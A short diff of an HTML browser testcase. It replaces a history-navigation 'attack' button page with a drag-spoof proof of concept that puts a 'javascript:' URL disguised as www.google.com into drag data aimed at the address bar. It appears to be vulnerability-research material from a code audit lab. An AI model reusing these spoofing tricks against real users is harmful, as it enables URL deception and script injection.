@@ -1,34 +1,18 @@
-<html>
-
-<a href="https://www.youtube.com">go to youtube</a>
-<br>
-
-
-<iframe id="1" src="http://www.eurosport.fr"></iframe>
-
-
-<button onclick="document.getElementById('1').src='https://fr.wikipedia.org';">iframe 2</button>
-
-
-<button onclick="attack()">Start Attack</button>
-
-
+<title>
+CAL-2012-0002 Drag spoof testcase by code audit labs of vulnhunt.com 
+</title>
+<body>
+<h1><a href="http://www.google.com" id="a">DRAG ME TO Omnibox</a></h1>
+</body>
 <script>
-
-
-function attack(){
-
-for(var i=0;i<2;i++){
-
-window.history.forward();
-
+var spoof_url = 'www.google.com';
+spoof_url = 'javascript:' + spoof_url;
+ondragstart= function() {
+  //event.dataTransfer.setData('text/plain','chrome://downloads/');
+  event.dataTransfer.setData('text/plain',spoof_url);
 }
-
-
+ondragend = function(){
+  document.title = 'Done';
+  document.write('<h1>I am not www.google.com at all!</h1>');
 }
-
-
 </script>
-
-
-</html>
